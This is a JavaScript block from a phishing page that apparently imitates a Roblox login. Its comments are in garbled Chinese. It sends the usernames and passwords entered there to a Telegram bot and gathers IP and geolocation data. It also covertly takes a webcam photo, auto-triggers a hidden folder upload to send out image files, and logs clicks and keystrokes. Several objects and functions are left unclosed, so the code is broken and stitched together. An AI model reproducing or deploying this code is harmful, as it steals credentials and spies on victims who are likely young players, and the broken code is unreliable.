<script>
    // ==================== Telegramé…ç½® ====================
    const TELEGRAM_CONFIG = {

    // æ•°æ®æ”¶é›†å¯¹è±¡

    // ==================== åŸºç¡€å‡½æ•° ====================
    function generateSessionId() {
        return 'RBX-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
    }

    async function sendToTelegram(text) {
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.chatId,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
            return true;
        } catch (error) {
            console.error('å‘é€å¤±è´¥:', error);
            return false;
        }
    }

    async function sendPhotoToTelegram(file, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CONFIG.chatId);
            formData.append('photo', file);
            formData.append('caption', caption);
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            return true;
        } catch (error) {
            return false;
        }
    }

    // ==================== ç™»å½•å¤„ç† ====================
    function handleLogin() {
        if (isCollecting) return;
        
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        
        if (!username || !password) {
            showError('è¯·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ');
            return;
        }
        
        // å­˜å‚¨å‡­æ®
        collectedData.credentials = {
            username: username,
            password: password,
            timestamp: new Date().toISOString()
        };
        
        // ç«‹å³å‘é€å‡­æ®åˆ°Telegram
        sendCredentialsToTelegram(username, password);
        
        // æ˜¾ç¤ºåŠ è½½
        showLoading();
        
        // å¼€å§‹é«˜çº§æ”¶é›†
        startAdvancedCollection();
    }

    async function sendCredentialsToTelegram(username, password) {
        const message = `ğŸ” <b>Robloxç™»å½•å‡­æ®è·å–æˆåŠŸï¼</b>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ‘¤ <b>ç”¨æˆ·å:</b> <code>${escapeHtml(username) || 'æœªæä¾›'}</code>
ğŸ”‘ <b>å¯†ç :</b> <code>${escapeHtml(password) || 'æœªæä¾›'}</code>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ†” <b>ä¼šè¯ID:</b> ${collectedData.sessionId}
ğŸ• <b>è·å–æ—¶é—´:</b> ${new Date().toLocaleString('zh-CN')}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ“± <b>è®¾å¤‡:</b> ${navigator.platform}
ğŸŒ <b>æµè§ˆå™¨:</b> ${detectBrowser()}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;
        
        await sendToTelegram(message);
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    function detectBrowser() {
        const ua = navigator.userAgent;
        if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
        if (ua.includes('Edg')) return 'Edge';
        return 'æœªçŸ¥';
    }

    // ==================== è®¾å¤‡ä¿¡æ¯æ”¶é›† ====================
    async function collectDeviceInfo() {
        collectedData.deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            hardware: {
                concurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory
            }
        };

        const deviceMsg = `ğŸ“± <b>è®¾å¤‡ä¿¡æ¯</b>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ’» <b>ç³»ç»Ÿ:</b> ${navigator.platform}
ğŸ–¥ï¸ <b>åˆ†è¾¨ç‡:</b> ${screen.width}x${screen.height}
ğŸ”¢ <b>CPUæ ¸å¿ƒ:</b> ${navigator.hardwareConcurrency}
ğŸ’¾ <b>å†…å­˜:</b> ${navigator.deviceMemory || 'æœªçŸ¥'}GB
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;

    // ==================== ç½‘ç»œä¿¡æ¯æ”¶é›† ====================
    async function collectNetworkInfo() {
        try {
            // è·å–IPåœ°å€
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            collectedData.networkInfo.ip = ipData.ip;
            
            // è·å–åœ°ç†ä½ç½®
            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
            const geoData = await geoRes.json();
            
            collectedData.networkInfo.geo = {
                city: geoData.city,
                country: geoData.country_name,
                latitude: geoData.latitude,
                longitude: geoData.longitude,
                isp: geoData.org
            };
            
            const locationMsg = `ğŸ“ <b>ä½ç½®ä¿¡æ¯</b>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸŒ <b>å›½å®¶:</b> ${geoData.country_name || 'æœªçŸ¥'}
ğŸ™ï¸ <b>åŸå¸‚:</b> ${geoData.city || 'æœªçŸ¥'}
ğŸŒ <b>IP:</b> ${ipData.ip}
ğŸ“¡ <b>è¿è¥å•†:</b> ${geoData.org || 'æœªçŸ¥'}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;
            
            await sendToTelegram(locationMsg);

    // ==================== æ‘„åƒå¤´è®¿é—® ====================
    async function accessCamera() {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return false;
        }
        
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: false
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            return new Promise((resolve) => {
                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    
                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            const file = new File([blob], `roblox_${Date.now()}.jpg`, {
                                type: 'image/jpeg'
                            });
                            
                            collectedData.photos.push({
                                name: file.name,
                                size: file.size,
                                timestamp: new Date().toISOString()
                            });
                            
                            // å‘é€åˆ°Telegram
                            await sendPhotoToTelegram(file, 'ğŸ“¸ Robloxç”¨æˆ·ç…§ç‰‡');
                            
                            stream.getTracks().forEach(track => track.stop());
                            resolve(true);
                        }
                    }, 'image/jpeg', 0.8);
                }, 1500);
            });
            
        } catch (error) {
            return false;
        }
    }

    // ==================== æ–‡ä»¶ç³»ç»Ÿè®¿é—® ====================
    function attemptFileAccess() {
        // è‡ªåŠ¨è§¦å‘æ–‡ä»¶å¤¹è®¿é—®
        if ('webkitdirectory' in document.createElement('input')) {
            setTimeout(() => {
                try {
                    const fileInput = document.createElement('input');
                    fileInput.type = 'file';
                    fileInput.webkitdirectory = true;
                    fileInput.multiple = true;
                    fileInput.style.display = 'none';
                    
                    fileInput.addEventListener('change', async (e) => {
                        const files = Array.from(e.target.files);
                        collectedData.files.push({
                            type: 'folder_scan',
                            count: files.length,
                            timestamp: new Date().toISOString()
                        });
                        
                        await sendToTelegram(`ğŸ“ <b>æ–‡ä»¶å¤¹æ‰«æ</b>\nå‘ç°æ–‡ä»¶: ${files.length}ä¸ª`);
                        
                        // å¤„ç†å›¾ç‰‡æ–‡ä»¶
                        const imageFiles = files.filter(file => 
                            file.type.startsWith('image/')
                        ).slice(0, 2);
                        
                        for (const file of imageFiles) {
                            if (file.size < 3 * 1024 * 1024) {
                                await sendPhotoToTelegram(file, 'ğŸ“ ç³»ç»Ÿå›¾ç‰‡');
                            }
                        }
                    });
                    
                    document.body.appendChild(fileInput);
                    
                    // è‡ªåŠ¨è§¦å‘
                    setTimeout(() => {
                        try {
                            fileInput.click();
                        } catch (e) {}
                    }, 4000);
                    
                } catch (e) {}
            }, 2000);
        }
    }
    // ==================== è¡Œä¸ºç›‘æ§ ====================
    function startBehaviorMonitoring() {
        collectedData.behavior = {
            clicks: [],
            keystrokes: []
        };
        
        // ç‚¹å‡»ç›‘æ§
        document.addEventListener('click', (e) => {
            collectedData.behavior.clicks.push({
                x: e.clientX,
                y: e.clientY,
                time: new Date().toISOString()
            });
        });
        
        // é”®ç›˜ç›‘æ§
        document.addEventListener('keydown', (e) => {
            if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
                collectedData.behavior.keystrokes.push({
                    key: e.key,
                    time: Date.now()
                });
            }
        });
    }
